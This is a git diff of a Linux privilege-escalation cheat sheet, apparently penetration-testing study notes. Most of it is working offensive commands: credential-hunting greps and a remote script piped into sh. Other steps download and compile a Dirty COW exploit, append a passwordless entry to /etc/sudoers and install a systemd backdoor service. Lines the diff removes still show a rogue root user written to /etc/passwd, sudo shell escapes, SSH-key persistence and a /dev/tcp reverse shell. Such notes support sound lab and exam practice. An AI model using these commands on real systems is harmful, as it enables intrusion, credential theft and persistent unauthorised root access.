@@ -1,4 +1,16 @@
-# Linux Privilege Escalation
+# Stabilize Shell
+We often land with an unstable shell that makes further enumeration more difficult, so we should address it first.
+
+## Python Shell Stabilizer (1/2)
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+**Press CTRL+Z** to background the process, then run:
+## Python Shell Stabilizer (2/2)
+```bash
+stty raw -echo; fg; export TERM=xterm
+```
 
 ## Check current user and group memberships
 ```bash
@@ -9,13 +21,7 @@ id
 ```bash
 cat /etc/passwd
 ```
-
-## Check if /etc/passwd is writable and create new root user
-```bash
-ls -la /etc/passwd
-echo "root2:$(openssl passwd Password123):0:0:root:/root:/bin/bash" >> /etc/passwd
-su root2
-```
+Is /etc/passwd writable? Create a new user or remote the 'x' from an existing user to effectively remove their password.
 
 ## Display hostname
 ```bash
@@ -34,15 +40,12 @@ lsb_release -a
 ## List all running processes
 ```bash
 ps aux
-ps -ef
 ```
 
 ## Monitor processes continuously with pspy
-```bash
-wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
-chmod +x pspy64
-./pspy64
-```
+https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
+Transfer to target and run.
+Use `timeout 20 ./pspy64` to end after 20 seconds (otherwise can only exit with CTRL+C which will kill most reverse shells)
 
 ## Watch for password-related processes
 ```bash
@@ -52,23 +55,16 @@ watch -n 1 "ps -aux | grep pass"
 ## Display network interfaces and IP addresses
 ```bash
 ip a
-ip addr show
-ifconfig
 ```
 
 ## Show routing table
 ```bash
-route
 ip route
-netstat -rn
 ```
 
-## List active network connections and listening ports
+## List all network connections and listening ports
 ```bash
-ss -anp
-ss -tulpn
-netstat -anp
-netstat -tulpn
+ss -antup
 ```
 
 ## Check iptables firewall rules
@@ -117,6 +113,39 @@ rpm -qa
 yum list installed
 ```
 
+# Credential Hunting
+https://osintteam.blog/oscp-exam-success-10-must-know-commands-and-tools-every-pentester-should-master-4b514bf64ccd
+## grep /etc for "password"
+```
+grep -rni 'password' /etc 2>/dev/null
+```
+
+## grep for Private Keys
+```
+grep -rni 'PRIVATE KEY' /home 2>/dev/null
+```
+
+## grep webroot for "password"
+```
+grep -Horn password /var/www
+```
+
+## grep Credential Hunt All
+```
+grep -rni --color=always 'password\|secret\|key\|token' /etc 2>/dev/null
+```
+
+## find credential hunting
+```
+find / -type f -exec grep -i -I "pass\|cred\|key\|secret" {} /dev/null \;
+```
+
+## Find nonempty directories
+Automated tools may miss unusual directories. Same time when `tree` isn't available.
+```
+find . -type d ! -empty
+```
+
 ## Find all writable directories
 ```bash
 #find / -perm -222 -type d 2>/dev/null
@@ -127,18 +156,15 @@ find / -writable -type d 2>/dev/null
 ## Find all SUID files
 ```bash
 find / -perm -u=s -type f 2>/dev/null
-find / -perm -4000 -type f 2>/dev/null
 ```
 
 ## Find all SGID files
 ```bash
 find / -perm -g=s -type f 2>/dev/null
-find / -perm -2000 -type f 2>/dev/null
 ```
 
 ## Find files with capabilities set
 ```bash
-/usr/sbin/getcap -r / 2>/dev/null
 getcap -r / 2>/dev/null
 ```
 
@@ -182,15 +208,12 @@ unix-privesc-check standard > output.txt
 unix-privesc-check detailed > output.txt
 ```
 
-## Download and run LinPEAS
-```bash
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-./linpeas.sh | tee linpeas_output.txt
-```
+
+## LinPEAS 
+/usr/share/peass/linpeas/linpeas.sh on kali. Transfer to target and tee to output file.
 
 ## Download and run LinEnum
+
 ```bash
 curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
@@ -207,38 +230,9 @@ chmod +x linux-exploit-suggester.sh
 ```
 
 ## Check sudo permissions
+Check gtfobins for interesting entries.
 ```bash
 sudo -l
-```
-
-## Exploit sudo vi for shell
-```bash
-sudo vi -c ':!/bin/sh' /dev/null
-sudo vi
-# Then type: :!/bin/bash
-```
-
-## Exploit sudo awk for shell
-```bash
-sudo awk 'BEGIN {system("/bin/sh")}'
-```
-
-## Exploit sudo find for shell
-```bash
-sudo find . -exec /bin/sh \; -quit
-sudo find / -name test -exec /bin/bash \;
-```
-
-## Exploit sudo nmap for shell
-```bash
-sudo nmap --interactive
-# Then type: !sh
-```
-
-## Exploit sudo less for shell
-```bash
-sudo less /etc/hosts
-# Then type: !/bin/bash
 ```
 
 ## Exploit PATH hijacking with writable directory
@@ -303,13 +297,6 @@ find / -name "authorized_keys" 2>/dev/null
 find /home -name ".ssh" 2>/dev/null
 ```
 
-## Check kernel version for exploit research
-```bash
-uname -r
-uname -a
-cat /proc/version
-```
-
 ## Compile and run Dirty COW exploit
 ```bash
 curl -o dirty.c https://www.exploit-db.com/download/40611
@@ -344,15 +331,6 @@ searchsploit -m 1518
 ## Add user to sudoers file
 ```bash
 echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
-echo "attacker ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers
-```
-
-## Install SSH key for persistence
-```bash
-mkdir -p /root/.ssh
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> /root/.ssh/authorized_keys
-chmod 600 /root/.ssh/authorized_keys
-chmod 700 /root/.ssh
 ```
 
 ## Create systemd backdoor service
@@ -371,20 +349,6 @@ WantedBy=multi-user.target
 EOF
 systemctl enable backdoor.service
 systemctl start backdoor.service
-```
-
-## Create nested reverse shell for stability
-```bash
-bash -c 'bash -i >& /dev/tcp/10.10.14.5/5678 0>&1'
-```
-
-## Upgrade shell to fully interactive TTY
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
-# Press Ctrl-Z
-stty raw -echo; fg
-# Press Enter twice
-stty rows 38 cols 116
 ```
 
 ## Search for readable sensitive files
